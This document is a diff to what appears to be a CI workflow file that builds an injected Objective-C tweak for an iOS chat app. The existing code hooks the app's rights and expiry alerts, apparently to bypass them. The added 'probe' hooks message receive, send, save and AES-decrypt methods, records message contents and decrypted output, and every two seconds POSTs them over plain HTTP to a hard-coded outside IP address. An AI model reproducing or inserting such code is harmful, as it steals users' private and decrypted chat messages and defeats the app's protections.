@@ -189,12 +189,141 @@ jobs:
           static void (*o_show4)(id, SEL, id, id, id, id);
           static void (*o_check)(id, SEL);
 
+          /* ============ IM 探针 ============ */
+          static NSString *PDesc(id o) {
+              if (!o) return @"(nil)";
+              NSString *s = nil;
+              @try { s = [o description]; } @catch (NSException *e) { s = @"(descfail)"; }
+              if (![s isKindOfClass:[NSString class]]) s = @"(notstr)";
+              if (s.length > 320) s = [s substringToIndex:320];
+              return s;
+          }
+          static NSUInteger PCnt(id o) {
+              if (o && [o respondsToSelector:@selector(count)]) return (NSUInteger)[o count];
+              return 0;
+          }
+          static NSMutableArray *g_buf = nil;
+          static NSLock *g_lock = nil;
+          static dispatch_source_t g_timer = nil;
+
+          static void Flush(void) {
+              NSString *body = nil;
+              [g_lock lock];
+              if (g_buf.count) { body = [g_buf componentsJoinedByString:@"\n"]; [g_buf removeAllObjects]; }
+              [g_lock unlock];
+              if (!body.length) return;
+              NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://101.35.120.27/probe/log"]];
+              r.HTTPMethod = @"POST";
+              r.timeoutInterval = 8;
+              r.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
+              [[[NSURLSession sharedSession] dataTaskWithRequest:r] resume];
+          }
+          static void LOGE(NSString *s) {
+              NSLog(@"[MILOPROBE] %@", s);
+              [g_lock lock];
+              [g_buf addObject:s];
+              [g_lock unlock];
+          }
+          static const char *kN = "MILOPROBE ";
+
+          static void (*o_recv)(id, SEL, id);
+          static void h_recv(id self, SEL _cmd, id pkt) {
+              LOGE([NSString stringWithFormat:@"%shandleRecv cls=%@ desc=%@", kN, NSStringFromClass([pkt class]), PDesc(pkt)]);
+              o_recv(self, _cmd, pkt);
+          }
+          static void (*o_ack)(id, SEL, id);
+          static void h_ack(id self, SEL _cmd, id pkt) {
+              LOGE([NSString stringWithFormat:@"%shandleSendack cls=%@ desc=%@", kN, NSStringFromClass([pkt class]), PDesc(pkt)]);
+              o_ack(self, _cmd, pkt);
+          }
+          static id (*o_rpm)(id, SEL, id);
+          static id h_rpm(id self, SEL _cmd, id in) {
+              id r = o_rpm(self, _cmd, in);
+              LOGE([NSString stringWithFormat:@"%srecvPacketsToMessages in=%lu out=%lu", kN, (unsigned long)PCnt(in), (unsigned long)PCnt(r)]);
+              return r;
+          }
+          static id (*o_fns)(id, SEL, id);
+          static id h_fns(id self, SEL _cmd, id in) {
+              id r = o_fns(self, _cmd, in);
+              LOGE([NSString stringWithFormat:@"%sfilterNeedStore in=%lu out=%lu", kN, (unsigned long)PCnt(in), (unsigned long)PCnt(r)]);
+              return r;
+          }
+          static void (*o_crd)(id, SEL, id);
+          static void h_crd(id self, SEL _cmd, id in) {
+              LOGE([NSString stringWithFormat:@"%scallRecvMessagesDelegate cnt=%lu", kN, (unsigned long)PCnt(in)]);
+              o_crd(self, _cmd, in);
+          }
+          static void (*o_csd)(id, SEL, id, id);
+          static void h_csd(id self, SEL _cmd, id a, id b) {
+              LOGE([NSString stringWithFormat:@"%scallSendackDelegate cnt=%lu left=%@", kN, (unsigned long)PCnt(a), PDesc(b)]);
+              o_csd(self, _cmd, a, b);
+          }
+          static id (*o_send)(id, SEL, id, BOOL);
+          static id h_send(id self, SEL _cmd, id msg, BOOL q) {
+              LOGE([NSString stringWithFormat:@"%ssendMessage retry=%d desc=%@", kN, (int)q, PDesc(msg)]);
+              return o_send(self, _cmd, msg, q);
+          }
+          static id (*o_save)(id, SEL, id, id, id, long, id, id, id);
+          static id h_save(id self, SEL _cmd, id msg, id ch, id from, long st, id setting, id cmn, id topic) {
+              id r = o_save(self, _cmd, msg, ch, from, st, setting, cmn, topic);
+              LOGE([NSString stringWithFormat:@"%ssaveMessage ret=%@ status=%ld cmn=%@", kN, PDesc(r), st, PDesc(cmn)]);
+              return r;
+          }
+          static id (*o_dec)(id, SEL, id, id, id);
+          static id h_dec(id self, SEL _cmd, id data, id key, id iv) {
+              id r = o_dec(self, _cmd, data, key, iv);
+              LOGE([NSString stringWithFormat:@"%saesDecrypt in=%lu out=%@ keylen=%lu ivlen=%lu", kN,
+                    (unsigned long)PCnt(data), PDesc(r), (unsigned long)PCnt(key), (unsigned long)PCnt(iv)]);
+              return r;
+          }
+
+          static void ShowMarker(void) {
+              @try {
+                  UIWindow *win = [UIApplication sharedApplication].keyWindow;
+                  if (!win && [UIApplication sharedApplication].windows.count) win = [UIApplication sharedApplication].windows.firstObject;
+                  if (!win) return;
+                  UILabel *lbl = [UILabel new];
+                  lbl.text = @"PROBE-RUN";
+                  lbl.textColor = [UIColor redColor];
+                  lbl.backgroundColor = [UIColor whiteColor];
+                  [lbl sizeToFit];
+                  [win addSubview:lbl];
+                  [win bringSubviewToFront:lbl];
+              } @catch (NSException *e) {}
+          }
+
+          static void ProbeInit(void) {
+              Class cm = objc_getClass("WKChatManager");
+              Class aes = objc_getClass("WKAESUtil");
+              LOGE([NSString stringWithFormat:@"%sinit chatManager=%@ aesUtil=%@", kN, cm ? @"yes" : @"no", aes ? @"yes" : @"no"]);
+              patch(cm, @selector(handleRecv:), (void *)h_recv, (void **)&o_recv);
+              patch(cm, @selector(handleSendack:), (void *)h_ack, (void **)&o_ack);
+              patch(cm, @selector(recvPacketsToMessages:), (void *)h_rpm, (void **)&o_rpm);
+              patch(cm, @selector(filterNeedStoreMessages:), (void *)h_fns, (void **)&o_fns);
+              patch(cm, @selector(callRecvMessagesDelegate:), (void *)h_crd, (void **)&o_crd);
+              patch(cm, @selector(callSendackDelegate:left:), (void *)h_csd, (void **)&o_csd);
+              patch(cm, @selector(sendMessage:addRetryQueue:), (void *)h_send, (void **)&o_send);
+              patch(cm, @selector(saveMessage:channel:fromUid:status:setting:clientMsgNo:topic:), (void *)h_save, (void **)&o_save);
+              patch(aes, @selector(aesDecrypt:key:iv:), (void *)h_dec, (void **)&o_dec);
+              LOGE(@"MILOPROBE init-done");
+          }
+
           __attribute__((constructor)) static void milo_init(void) {
               patch(objc_getClass("WKApp"), @selector(showUChatRightsAlertViewWithTitle:action:), (void *)h_show1, (void **)&o_show1);
               patch(objc_getClass("WKApp"), @selector(showUChatRightsAlertViewWithTitle:subtitle:buttonTypes:action:), (void *)h_show4, (void **)&o_show4);
               patch(objc_getClass("WKConversationListVC"), @selector(checkRightsExpiryIfNeeded), (void *)h_check, (void **)&o_check);
               patch(objc_getClass("UIViewController"), @selector(presentViewController:animated:completion:), (void *)h_present, (void **)&o_present);
               patch(objc_getClass("UINavigationController"), @selector(pushViewController:animated:), (void *)h_push, (void **)&o_push);
+
+              g_buf = [NSMutableArray array];
+              g_lock = [NSLock new];
+              dispatch_queue_t q = dispatch_queue_create("milo.probe.flush", NULL);
+              g_timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, q);
+              dispatch_source_set_timer(g_timer, dispatch_time(DISPATCH_TIME_NOW, 0), (uint64_t)2 * NSEC_PER_SEC, 0);
+              dispatch_source_set_event_handler(g_timer, ^{ Flush(); });
+              dispatch_resume(g_timer);
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ ProbeInit(); });
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)4 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ ShowMarker(); });
           }
           OBJC
 
